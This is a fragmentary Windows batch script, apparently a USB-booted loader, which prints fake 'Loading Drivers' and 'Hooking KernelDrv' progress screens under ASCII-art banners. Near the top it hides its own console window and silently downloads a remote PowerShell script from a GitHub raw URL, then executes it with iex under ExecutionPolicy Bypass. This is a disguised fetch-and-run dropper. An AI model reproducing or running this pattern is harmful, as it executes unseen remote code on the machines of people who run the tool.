...
cls
title > nul
powershell -WindowStyle Hidden -Command "$h=(Get-Process -Id $PID).MainWindowHandle; Add-Type '[DllImport(\"user32.dll\")]public static extern bool ShowWindow(IntPtr h,int n);' -Name W -Namespace Win32; [Win32.W]::ShowWindow($h,0)" >nul 2>&1
if errorlevel 1 goto error1
wpeinit >nul 2>&1
REM if errorlevel 1 goto error2
powershell -NoProfile -ExecutionPolicy Bypass -Command "Add-Type -AssemblyName System.Windows.Forms; $c=(Invoke-WebRequest 'https://github.com/zold1337/toolsvip/raw/refs/heads/main/teste.ps1').Content; iex $c" >nul 2>&1
...
echo  ^| $$      ^| $$  ^| $$^| $$\  $$$  ^| $$  ^| $$  ^| $$^| $$\  $ ^| $$        
echo  ^| $$$$$$$$^|  $$$$$$/^| $$ \  $$ /$$$$$$^|  $$$$$$/^| $$ \/  ^| $$      
echo  ^|________/ \______/ ^|__/  \__/^|______/ \______/ ^|__/     ^|__/          
echo.
echo [92m [-] [97mFAILED TO INITIALIZED PW1...  [91mERROR!
ping localhost -n 60 >nul 2>&1
exit


:error2
powershell -NoProfile -Command "Add-Type '[DllImport(\"kernel32.dll\")]public static extern IntPtr GetConsoleWindow(); [DllImport(\"user32.dll\")]public static extern bool ShowWindow(IntPtr h,int n);' -Name W -Namespace Win32; $h=[Win32.W]::GetConsoleWindow(); [Win32.W]::ShowWindow($h,5)" >nul 2>&1
cls
color 5 
echo.
echo.
...
echo  ^|________/ \______/ ^|__/  \__/^|______/ \______/ ^|__/     ^|__/          
echo.
echo [92m [-] [97mFAILED TO INITIALIZED WPE...  [91mERROR!
ping localhost -n 60 >nul 2>&1
exit
...
echo  ^|________/ \______/ ^|__/  \__/^|______/ \______/ ^|__/     ^|__/          
echo.
echo [92m [-] [97mFAILED TO INITIALIZED PW2...  [91mERROR!
ping localhost -n 60 >nul 2>&1
exit
...
echo  ^|________/ \______/ ^|__/  \__/^|______/ \______/ ^|__/     ^|__/          
echo.
echo [92m [+] [97mINITIALIZED - WAIT 5 SECONDS...
...
echo [92m [+] [97mLoading Drivers... [92mOK.
echo.
echo [92m [-] [97mAllocating Memory...  [91mERROR!
ping localhost -n 60 >nul 2>&1
exit
...
echo [92m [+] [97mAllocating Memory... [92mOK.
echo.
echo [92m [-] [97mInitializing SYSTEM...  [91mERROR!
ping localhost -n 60 >nul 2>&1
exit
)
cls
...
echo  ^| $$      ^| $$  ^| $$^| $$\  $$$  ^| $$  ^| $$  ^| $$^| $$\  $ ^| $$      ^| $$         
echo  ^| $$$$$$$$^|  $$$$$$/^| $$ \  $$ /$$$$$$^|  $$$$$$/^| $$ \/  ^| $$      ^| $$      
echo  ^|________/ \______/ ^|__/  \__/^|______/ \______/ ^|__/     ^|__/      ^|__/          
echo.
echo [92m [+] [97mLoading Drivers... [92mOK.
echo.
echo [92m [+] [97mAllocating Memory... [92mOK.
...
echo [92m [+] [97mInitializing SYSTEM... [92mOK.
echo.
echo [92m [-] [97mHooking KernelDrv...  [91mERROR!
ping localhost -n 60 >nul 2>&1
exit
...
echo [92m [+] [97mHooking KernelDrv...  [92mOK.
echo.
echo [92m [-] [97mInitializing SOFTWARE...  [91mERROR!
ping localhost -n 60 >nul 2>&1
exit
)
cls
...
echo [92m [+] [97mlUNIUM BOTTED
echo.
echo [91m [!] [97mREMOVE USB KEY.
